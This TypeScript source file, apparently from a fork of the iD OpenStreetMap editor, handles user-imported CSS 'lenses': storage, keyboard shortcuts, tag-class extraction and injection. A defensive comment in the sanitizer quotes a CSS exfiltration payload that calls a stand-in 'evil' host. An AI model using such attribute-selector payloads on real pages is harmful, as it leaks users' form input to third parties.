import { prefs } from './preferences';
import {
    appendMaxspeedLensClasses,
    maxspeedAdvisoryColorBucket,
    maxspeedColorBucket,
    pickMaxspeedAdvisoryRaw,
    pickMaxspeedRaw
} from '../../config/maxspeed_lens.js';
import { BUNDLED_LENSES, DEFAULT_BUNDLED_LENS_ID, SURFACE_COLOURS_LENS_ID } from '../../config/bundled_lenses.js';
import { accessCategoryClassPrefix } from '../../config/tag_classes_custom.js';

export { DEFAULT_BUNDLED_LENS_ID, SURFACE_COLOURS_LENS_ID };

// UI lens support. A lens is a CSS file imported by the user and kept in
// localStorage (a single stylesheet is well within the ~5 MB quota). The active
// lens's CSS is injected into the page, and the OSM keys it styles via
// `tag-{key}` / `tag-{key}-{value}` selectors are emitted as classes on map
// elements (see svgTagClasses) so the rules actually apply.

/** Preference key holding the selected lens id. */
export const LENS_PREF = 'preferences.lens';
/** Preference key holding the JSON array of uploaded lenses. */
export const UPLOADED_LENSES_PREF = 'preferences.lens.uploaded';
/** Preference key holding the `{ letter: lensId }` shortcut map. */
export const LENS_SHORTCUTS_PREF = 'preferences.lens.shortcuts';
/** Id of the built-in (no custom CSS) lens. */
export const DEFAULT_LENS_ID = 'default';
/** Fixed `⌥`+letter shortcut that switches back to the default lens (lens off). */
export const DEFAULT_LENS_SHORTCUT = 'd';
/** Fixed `⌥`+letter shortcuts for fork lenses bundled at build time. */
export const BUNDLED_LENS_SHORTCUTS: Readonly<Record<string, string>> = {
    q: 'bundled-quebec',
    s: 'bundled-quebec-surfaces',
    m: 'bundled-maxspeed-colors'
};
/** Renamed bundled lens ids (local prefs may still hold the old values). */
const LEGACY_BUNDLED_LENS_IDS: Record<string, string> = {
    'bundled-v5-quebec': 'bundled-quebec',
    'bundled-v5-quebec-surfaces': 'bundled-quebec-surfaces'
};
/**
 * Letters that cannot be assigned to a lens because `⌥`+letter is already taken:
 *   - `w` -> global `⌥W` toggles the OSM layer (see modules/ui/init.js)
 *   - `d` -> reserved for the default lens (DEFAULT_LENS_SHORTCUT)
 *   - `q`, `s`, `m` -> reserved for bundled lenses (BUNDLED_LENS_SHORTCUTS)
 */
export const RESERVED_LENS_SHORTCUTS = new Set([
    'w',
    DEFAULT_LENS_SHORTCUT,
    ...Object.keys(BUNDLED_LENS_SHORTCUTS)
]);

/** A CSS lens shipped with this fork (bundled at build time). */
export interface BundledLens {
    id: string;
    nameKey: string;
    css: string;
}

/** A CSS lens imported by the user and stored in localStorage. */
export interface UploadedLens {
    id: string;
    name: string;
    css: string;
}

/** A selectable entry in the lens picker. */
export interface LensEntry {
    id: string;
    name?: string;
    nameKey?: string;
    source: 'default' | 'bundled' | 'uploaded';
}

/**
 * Uploaded lenses stored in localStorage.
 * @returns the stored lenses (empty array on missing/invalid data)
 */
export function getUploadedLenses(): UploadedLens[] {
    try {
        const raw = prefs(UPLOADED_LENSES_PREF);
        const parsed = JSON.parse((typeof raw === 'string' ? raw : '') || '[]');
        return Array.isArray(parsed) ? parsed : [];
    } catch {
        return [];
    }
}

function saveUploadedLenses(lenses: UploadedLens[]): void {
    prefs(UPLOADED_LENSES_PREF, JSON.stringify(lenses));
}

/**
 * Persist a new uploaded CSS lens.
 * @param lens - display name and raw CSS text
 * @returns the stored lens, with its generated id
 */
export function addUploadedLens({ name, css }: { name: string; css: string }): UploadedLens {
    // Date.now() alone is not unique for files added in the same millisecond.
    const id = `uploaded-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    const lens: UploadedLens = { id, name, css: sanitizeLensCss(css) };
    saveUploadedLenses([...getUploadedLenses(), lens]);
    return lens;
}

/**
 * Reduce the attack surface of an imported lens's CSS. CSS cannot run scripts
 * in modern browsers, but it can still load remote resources (tracking) and,
 * combined with attribute selectors, exfiltrate field values to a remote server
 * (e.g. `input[value^="x"] { background: url(//evil/?x) }`). So we drop remote
 * fetches: `@import` rules are removed and every `url(...)` that is not an inline
 * `data:` URI is replaced with `none`. UI-spoofing via layout rules remains
 * possible, hence the "import only trusted lenses" warning in the UI.
 *
 * Note: comment- or escape-obfuscated `@import`/`url` tokens are not honoured by
 * browsers either, so this regex pass is sufficient in practice.
 *
 * @param css - raw CSS text
 * @returns the sanitized CSS
 */
export function sanitizeLensCss(css: string): string {
    if (typeof css !== 'string') return '';
    return css
        .replace(/@import\b[^;]*;/gi, '')
        .replace(/url\(\s*(['"]?)([^)'"]*)\1\s*\)/gi,
            (match, _quote, target) => /^\s*data:/i.test(target) ? match : 'none');
}

/**
 * Remove an uploaded lens; resets the selection to default if it was active.
 * @param id - id of the lens to remove
 */
export function removeUploadedLens(id: string): void {
    saveUploadedLenses(getUploadedLenses().filter((t) => t.id !== id));
    removeLensShortcut(id);
    if (getSelectedLensId() === id) setSelectedLensId(DEFAULT_LENS_ID);
}

/** @returns the fork lenses shipped in the build. */
export function getBundledLenses(): readonly BundledLens[] {
    return BUNDLED_LENSES;
}

/** @returns the selected lens id (DEFAULT_BUNDLED_LENS_ID when unset). */
export function getSelectedLensId(): string {
    const raw = prefs(LENS_PREF);
    if (typeof raw === 'string' && raw) return LEGACY_BUNDLED_LENS_IDS[raw] ?? raw;
    return DEFAULT_BUNDLED_LENS_ID;
}

/** @param id - the lens id to select */
export function setSelectedLensId(id: string): void {
    // The LENS_PREF onChange listener (registered in context.js) reacts by
    // calling applyLens(), which refreshes the tag keys and injects the CSS.
    prefs(LENS_PREF, id);
}

/** @returns the CSS of the active lens (empty for the default/built-in lens). */
export function getActiveLensCss(): string {
    const id = getSelectedLensId();
    if (id === DEFAULT_LENS_ID) return '';
    const bundled = BUNDLED_LENSES.find((t) => t.id === id);
    if (bundled) return bundled.css;
    const uploaded = getUploadedLenses().find((t) => t.id === id);
    return uploaded ? uploaded.css : '';
}

/** All selectable lenses: default, fork bundles, then uploaded imports. */
export function listLenses(): LensEntry[] {
    return [
        { id: DEFAULT_LENS_ID, source: 'default' },
        ...BUNDLED_LENSES.map((t) => ({ id: t.id, nameKey: t.nameKey, source: 'bundled' as const })),
        ...getUploadedLenses().map((t) => ({ id: t.id, name: t.name, source: 'uploaded' as const }))
    ];
}

// ---------------------------------------------------------------------------
// Lens keyboard shortcuts
//
// Each uploaded lens may be bound to a single letter, activated with `⌥`+letter
// (see behaviorLensShortcuts). The map is stored as `{ letter: lensId }`, which
// makes the "which lens for this key" lookup direct and guarantees one lens per
// letter.
// ---------------------------------------------------------------------------

/** True for a valid, assignable shortcut letter (`a`-`z`, excluding reserved). */
function isAssignableShortcut(letter: string): boolean {
    return /^[a-z]$/.test(letter) && !RESERVED_LENS_SHORTCUTS.has(letter);
}

/**
 * User-assigned `{ letter: lensId }` shortcuts from prefs (uploaded lenses only).
 * Reserved letters and bundled lens ids are dropped so stale prefs never override
 * the fixed bundled bindings.
 * @returns the cleaned user shortcut map (empty on missing/invalid data)
 */
function getUserLensShortcuts(): Record<string, string> {
    let parsed: unknown;
    try {
        const raw = prefs(LENS_SHORTCUTS_PREF);
        parsed = JSON.parse((typeof raw === 'string' ? raw : '') || '{}');
    } catch {
        return {};
    }
    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return {};
    const uploadedIds = new Set(getUploadedLenses().map((l) => l.id));
    const result: Record<string, string> = {};
    for (const [letter, id] of Object.entries(parsed as Record<string, string>)) {
        if (RESERVED_LENS_SHORTCUTS.has(letter)) continue;
        if (typeof id === 'string' && uploadedIds.has(id)) result[letter] = id;
    }
    return result;
}

/**
 * Full shortcut map: fixed bundled bindings plus user-assigned uploaded-lens letters.
 * @returns the merged shortcut map
 */
export function getLensShortcuts(): Record<string, string> {
    return { ...BUNDLED_LENS_SHORTCUTS, ...getUserLensShortcuts() };
}

function saveLensShortcuts(shortcuts: Record<string, string>): void {
    prefs(LENS_SHORTCUTS_PREF, JSON.stringify(shortcuts));
}

/**
 * The shortcut letter bound to a lens, if any.
 * @param id - lens id
 * @returns the letter, or undefined
 */
export function getShortcutForLens(id: string): string | undefined {
    for (const [letter, lensId] of Object.entries(BUNDLED_LENS_SHORTCUTS)) {
        if (lensId === id) return letter;
    }
    const shortcuts = getUserLensShortcuts();
    return Object.keys(shortcuts).find((letter) => shortcuts[letter] === id);
}

/**
 * The lens bound to a shortcut letter, if any.
 * @param letter - single lowercase letter
 * @returns the lens id, or undefined
 */
export function getLensIdByShortcut(letter: string): string | undefined {
    return getLensShortcuts()[letter];
}

/**
 * Bind a letter to a lens. The letter moves off any other lens that held it,
 * and the lens loses any letter it previously had (one letter per lens).
 * @param id - lens id
 * @param letter - single lowercase letter (`a`-`z`, not reserved)
 * @throws if the letter is not assignable
 */
export function setLensShortcut(id: string, letter: string): void {
    if (!isAssignableShortcut(letter)) {
        throw new Error(`Invalid lens shortcut letter: ${letter}`);
    }
    const shortcuts = getUserLensShortcuts();
    for (const existing of Object.keys(shortcuts)) {
        if (existing === letter || shortcuts[existing] === id) delete shortcuts[existing];
    }
    shortcuts[letter] = id;
    saveLensShortcuts(shortcuts);
}

/**
 * Remove the shortcut bound to a lens (no-op if it has none).
 * @param id - lens id
 */
export function removeLensShortcut(id: string): void {
    if (Object.values(BUNDLED_LENS_SHORTCUTS).includes(id)) return;
    const shortcuts = getUserLensShortcuts();
    let changed = false;
    for (const letter of Object.keys(shortcuts)) {
        if (shortcuts[letter] === id) { delete shortcuts[letter]; changed = true; }
    }
    if (changed) saveLensShortcuts(shortcuts);
}

// ---------------------------------------------------------------------------
// Lens-driven tag classes
//
// A lens's CSS may style features by OSM tag using `tag-{key}` /
// `tag-{key}-{value}` selectors. For those rules to match, map elements must
// carry the corresponding classes. We read the active lens's CSS, collect the
// referenced keys, and svgTagClasses emits them like secondary tags. The set is
// replaced whenever the lens changes, so classes a previous lens needed are
// dropped while the built-in secondaries always stay.
// ---------------------------------------------------------------------------

/**
 * Some `tag-*` classes are *computed* by tag_classes.js rather than coming from
 * an OSM `key=value`. Extraction takes the part before the first `-` as the key
 * (e.g. `.tag-cuisine-pizza` → `cuisine`), but for these the leading token is not
 * a real OSM key, so we skip it — otherwise we'd add a bogus secondary key and
 * try to read a tag that does not exist:
 *   - `status`     → from `tag-status` / `tag-status-{lifecycle}` (e.g. abandoned)
 *   - `wikidata`   → from `tag-wikidata` (any `*:wikidata` present)
 *   - `paved` / `unpaved` / `semipaved` → inferred highway surface *category*,
 *       not the literal `surface` tag (derived from several keys/values). The
 *       exact value stays available via the secondary `tag-surface-{value}`.
 *   - `custom`     → from `tag-custom-access-emphasis` (fork access-emphasis styling)
 */
const SYNTHETIC_TAG_TOKENS = new Set([
    'status', 'wikidata', 'paved', 'unpaved', 'semipaved', 'custom', 'has', 'xadv'
]);

/** Lens-required secondary keys, in their CSS-class form (`:` written as `_`). */
let lensSecondaryTagKeys = new Set<string>();

/** When true, core highway emphasis classes are kept even if the lens styles maxspeed. */
let lensPreservesCoreHighwayClasses = false;

/** @param keys - secondary keys required by the active lens's CSS */
export function setLensSecondaryTagKeys(keys: string[]): void {
    lensSecondaryTagKeys = new Set(Array.isArray(keys) ? keys : []);
}

/**
 * Test hook: whether the active lens is a full highway-style lens (Quebec).
 * @param preserve - keep structure/access emphasis classes when stripping
 */
export function setLensPreservesCoreHighwayClasses(preserve: boolean): void {
    lensPreservesCoreHighwayClasses = preserve;
}

/** @deprecated use setLensPreservesCoreHighwayClasses */
export function setLensPreservesMotorAccessClasses(preserve: boolean): void {
    setLensPreservesCoreHighwayClasses(preserve);
}

/**
 * Full highway lenses (Quebec) include maxspeed dash rules *and* rely on core
 * structure/access styling. Do not strip those classes — only for maxspeed-only lenses.
 * @param css - raw lens CSS
 * @returns whether core emphasis classes should be preserved
 */
export function lensCssPreservesCoreHighwayClasses(css: string): boolean {
    if (!css) return false;
    return /tag-access-(?:private|customers|permissive)/.test(css)
        && css.includes(':not(.tag-highway-footway)');
}

/** @deprecated use lensCssPreservesCoreHighwayClasses */
export function lensCssPreservesMotorAccessClasses(css: string): boolean {
    return lensCssPreservesCoreHighwayClasses(css);
}

/** @returns the lens-required secondary keys (CSS-class form) */
export function getLensSecondaryTagKeys(): string[] {
    return [...lensSecondaryTagKeys];
}

/**
 * Collect the OSM keys referenced by `tag-*` selectors in a lens's CSS. The key
 * is the part after `tag-` up to the first `-` (OSM keys never contain `-`; the
 * `-` separates key from value). Synthetic tokens are skipped.
 *
 * @param css - raw CSS text
 * @returns unique keys (CSS-class form, e.g. `cuisine`, `piste_type`)
 */
export function extractTagKeysFromCss(css: string): string[] {
    const keys = new Set<string>();
    if (typeof css !== 'string') return [];
    const re = /\.tag-([a-z0-9_]+)/g;
    let match: RegExpExecArray | null;
    while ((match = re.exec(css)) !== null) {
        const key = match[1];
        if (!SYNTHETIC_TAG_TOKENS.has(key)) keys.add(key);
    }
    // Attribute selectors (e.g. [class*="tag-maxspeed_advisory-"]) are not matched above.
    if (/tag-maxspeed_advisory|tag-has-maxspeed-advisory|tag-xadv-/.test(css)) {
        keys.add('maxspeed_advisory');
    }
    return [...keys];
}

/**
 * Append lens-required secondary tag classes for an entity. Iterates the
 * entity's actual tags and converts each key to its CSS-class form (`:` → `_`)
 * before matching the lens set. Using the real key avoids any `_`-vs-`:`
 * ambiguity (e.g. `piste:type` and a hypothetical `piste_type` both map to the
 * class `tag-piste_type`, and keys like `piste:type_for_x` round-trip cleanly).
 *
 * @param classes - class list being built (mutated)
 * @param t - entity tags
 */
export function appendLensTagClasses(classes: string[], t: Record<string, string>): void {
    if (lensSecondaryTagKeys.size === 0) return;

    if (lensSecondaryTagKeys.has('maxspeed')) {
        appendMaxspeedLensClasses(classes, 'maxspeed', pickMaxspeedRaw(t), maxspeedColorBucket);
    }
    if (lensSecondaryTagKeys.has('maxspeed_advisory')) {
        appendMaxspeedLensClasses(
            classes, 'maxspeed_advisory', pickMaxspeedAdvisoryRaw(t),
            maxspeedAdvisoryColorBucket, true
        );
    }

    for (const realKey in t) {
        if (realKey === 'maxspeed' || realKey.startsWith('maxspeed:')) continue;
        const classKey = realKey.replace(/:/g, '_');
        if (!lensSecondaryTagKeys.has(classKey)) continue;
        const value = t[realKey];
        if (!value || value === 'no') continue;
        if (classes.indexOf('tag-' + classKey) === -1) classes.push('tag-' + classKey);
        const valueClass = 'tag-' + classKey + '-' + value;
        if (classes.indexOf(valueClass) === -1) classes.push(valueClass);
    }
}

/** Core structure classes that override maxspeed lens advisory casing (50_misc.css). */
const MAXSPEED_LENS_STRUCTURE_CLASS_PREFIXES = [
    'tag-bridge',
    'tag-tunnel',
    'tag-embankment',
    'tag-cutting',
    'tag-location-underground',
    'tag-location-underwater'
];

/** Fork access classes that recolour footways/paths and motor roads (30_highways.css). */
const MAXSPEED_LENS_ACCESS_CLASS_PREFIXES = [
    'tag-access',
    'tag-foot',
    'tag-motor_vehicle',
    'tag-service'
];
const MAXSPEED_LENS_ACCESS_VALUES = new Set(['private', 'customers', 'permissive']);

function shouldStripClassForMaxspeedLens(klass: string): boolean {
    if (klass.startsWith(accessCategoryClassPrefix)) return !lensPreservesCoreHighwayClasses;
    if (lensPreservesCoreHighwayClasses) {
        if (klass === 'tag-custom-access-emphasis') return false;
        if (MAXSPEED_LENS_STRUCTURE_CLASS_PREFIXES.some(
            (prefix) => klass === prefix || klass.startsWith(prefix + '-')
        )) {
            return false;
        }
        for (const prefix of MAXSPEED_LENS_ACCESS_CLASS_PREFIXES) {
            if (!klass.startsWith(prefix + '-')) continue;
            const value = klass.slice(prefix.length + 1);
            if (MAXSPEED_LENS_ACCESS_VALUES.has(value)) return false;
        }
    }
    if (klass === 'tag-custom-access-emphasis') return true;
    if (MAXSPEED_LENS_STRUCTURE_CLASS_PREFIXES.some(
        (prefix) => klass === prefix || klass.startsWith(prefix + '-')
    )) {
        return true;
    }
    for (const prefix of MAXSPEED_LENS_ACCESS_CLASS_PREFIXES) {
        if (!klass.startsWith(prefix + '-')) continue;
        const value = klass.slice(prefix.length + 1);
        if (MAXSPEED_LENS_ACCESS_VALUES.has(value)) return true;
    }
    return false;
}

/**
 * Drop classes that conflict with maxspeed lens styling (structures, access colours).
 *
 * @param classes - class list being built (mutated)
 */
export function stripStructureClassesForMaxspeedLens(classes: string[]): void {
    if (!lensSecondaryTagKeys.has('maxspeed') && !lensSecondaryTagKeys.has('maxspeed_advisory')) {
        return;
    }
    for (let i = classes.length - 1; i >= 0; i--) {
        if (shouldStripClassForMaxspeedLens(classes[i])) {
            classes.splice(i, 1);
        }
    }
}

/**
 * Refresh the tag keys that the active lens's CSS needs, so map elements get the
 * matching `tag-*` classes. Call on lens change and at startup.
 */
export function refreshLensTagKeys(): void {
    const css = getActiveLensCss();
    setLensSecondaryTagKeys(extractTagKeysFromCss(css));
    lensPreservesCoreHighwayClasses = lensCssPreservesCoreHighwayClasses(css);
}

/** id of the <style> element holding the active lens's CSS. */
const LENS_STYLE_ELEMENT_ID = 'id-custom-lens-css';

/**
 * Inject the active lens's CSS into a dedicated <style> in the document head
 * (created on first use). Switching lenses replaces its content, so the previous
 * lens's rules are dropped. No-op outside a browser (e.g. tests without a DOM).
 *
 * The CSS is injected as-is, outside any cascade layer. Core styles are wrapped
 * in `@layer ideditor` at build time (see scripts/build_css.js), and unlayered
 * rules always beat layered ones, so a lens overrides core styling at any
 * specificity — no `!important` and no selector-specificity juggling needed.
 */
export function injectLensCss(): void {
    if (typeof document === 'undefined') return;
    let style = document.getElementById(LENS_STYLE_ELEMENT_ID) as HTMLStyleElement | null;
    if (!style) {
        style = document.createElement('style');
        style.id = LENS_STYLE_ELEMENT_ID;
        document.head.appendChild(style);
    }
    style.textContent = getActiveLensCss();
}

/** Apply the active lens: refresh its tag keys, inject its CSS, sync surface-mode class. */
export function applyLens(): void {
    refreshLensTagKeys();
    injectLensCss();
    syncDebugSurfacesClass();
}

/**
 * v5 parity: core orange `tag-name-no` over-stroke uses
 * `svg#surface:not(.debug-surfaces)` with `!important`. The surfaces lens always
 * enables surface colours on over-stroke, so toggle that class while it is active.
 */
function syncDebugSurfacesClass(): void {
    if (typeof document === 'undefined') return;
    const surface = document.getElementById('surface');
    if (!surface) return;
    surface.classList.toggle('debug-surfaces', getSelectedLensId() === SURFACE_COLOURS_LENS_ID);
}
